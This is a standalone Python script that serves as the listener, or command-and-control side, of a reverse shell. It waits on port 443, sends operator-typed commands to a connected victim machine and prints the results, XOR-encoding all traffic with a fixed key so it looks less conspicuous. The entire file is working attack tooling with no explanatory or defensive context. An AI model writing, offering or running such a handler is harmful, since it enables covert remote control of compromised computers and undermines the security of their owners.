#!/usr/bin/env python3

import socket

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind(("0.0.0.0", 443))
s.listen(2)

print("[+] Listening on port 443 ...")

(client, (ip, port)) = s.accept()

print("[+] Received connection from: {0}".format(ip))

while True:
    command = input('~$ ')
    byte_arr_encode = bytearray(command, 'utf-8')

    for i in range(len(byte_arr_encode)):
        byte_arr_encode[i] ^= 0x87

    client.send(byte_arr_encode)

    # received data as byte 
    en_data = client.recv(2048)
    # change byte to bytearray  
    byte_arr_data = bytearray(en_data)

    for i in range(len(byte_arr_data)):
        byte_arr_data[i] ^= 0x87

    # show on screen (decode bytearray object to string)
    print(byte_arr_data.decode('utf-8'))


client.close()
s.close()
